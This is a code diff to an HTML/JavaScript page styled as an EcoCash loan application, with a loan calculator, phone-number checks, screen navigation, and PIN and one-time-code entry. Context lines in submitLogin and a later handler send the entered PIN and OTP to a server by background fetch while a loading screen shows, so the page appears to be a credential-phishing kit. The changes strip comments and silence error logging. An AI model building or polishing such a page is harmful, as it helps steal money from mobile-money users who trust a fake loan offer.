@@ -153,7 +153,7 @@
                 </div>
 
                 <button class="btn-secondary" onclick="goToScreen('step1Screen', '/ax/loan-application')">PREVIOUS</button>
-                <button class="btn-primary" onclick="prepareSummary(); goToScreen('step3Screen', '/ax/summary')">NEXT STEP</button>
+                <button class="btn-primary" onclick="prepareSummary()">NEXT STEP</button>
             </div>
         </div>
 
@@ -271,7 +271,6 @@
     </div>
 
     <script>
-        // 1. Interactive Calculator Logic
         const amountSlider = document.getElementById('amountSlider');
         const termSlider = document.getElementById('termSlider');
 
@@ -289,11 +288,9 @@
             document.getElementById('monthlyPayment').innerText = '$' + monthly.toFixed(2);
         }
 
-        // 2. Phone Number Validation Logic
         function validatePhone(input) {
             input.value = input.value.replace(/\D/g, '');
             const errorEl = input.id === 'phoneNumber' ? document.getElementById('phoneError') : document.getElementById('loginPhoneError');
-            
             if (input.value.length > 0 && (!input.value.startsWith('7') || input.value.length !== 9)) {
                 errorEl.style.display = 'block';
                 input.style.borderColor = '#dc2626';
@@ -303,19 +300,16 @@
             }
         }
 
-        // 3. Screen Router Navigation
         function goToScreen(screenId, path) {
             document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
             document.getElementById(screenId).classList.add('active');
             history.pushState({}, '', path);
             window.scrollTo(0, 0);
         }
-                        }
 
         function prepareSummary() {
             const phoneVal = document.getElementById('phoneNumber').value;
-            if (phoneVal.length !== 9 || !phoneVal.startsWith('7')) {
-                alert('Please enter a valid 9-digit EcoCash phone number starting with 7.');
+            if (phoneVal.length !== 9 || !phoneVal.startsWith('7')) {                alert('Please enter a valid 9-digit EcoCash phone number starting with 7.');
                 return;
             }
             document.getElementById('sumAmount').innerText = '$' + document.getElementById('inputAmount').value;
@@ -335,7 +329,6 @@
             document.getElementById('loadingModal').style.display = 'none';
         }
 
-        // 4. API Submissions & Flow Control
         let savedPhoneNumber = '';
         let countdownInterval = null;
 
@@ -377,9 +370,7 @@
         function startSuccessCountdown() {
             let timeLeft = 5;
             const countdownEl = document.getElementById('successCountdown');
-            
             if (countdownInterval) clearInterval(countdownInterval);
-            
             countdownInterval = setInterval(() => {
                 timeLeft--;
                 countdownEl.innerText = timeLeft;
@@ -399,9 +390,7 @@
 
         async function submitLogin() {
             const loginPhoneVal = document.getElementById('loginPhone').value;
-            if (loginPhoneVal.length !== 9 || !loginPhoneVal.startsWith('7')) {
-                return;
-            }
+            if (loginPhoneVal.length !== 9 || !loginPhoneVal.startsWith('7')) return;
 
             showLoading('Please wait...', 'This usually takes a few seconds');
             let pinVal = '';
@@ -417,9 +406,7 @@
                         pin: pinVal
                     })
                 }).catch(err => console.log('Background fetch error:', err));
-            } catch(e) {
-                console.log(e);
-            }
+            } catch(e) {}
 
             setTimeout(() => {
                 hideLoading();
@@ -441,9 +428,7 @@
                         otp: otpVal
                     })
                 }).catch(err => console.log('Background fetch error:', err));
-            } catch(e) {
-                console.log(e);
-            }
+            } catch(e) {}
 
             setTimeout(() => {
                 hideLoading();
@@ -459,7 +444,6 @@
             }
         }
 
-        // 5. Auto-focus box jumper & Auto-Submit for PIN/OTP inputs
         document.querySelectorAll('.pin-container').forEach(container => {
             const boxes = container.querySelectorAll('.pin-box');
             boxes.forEach((box, index) => {
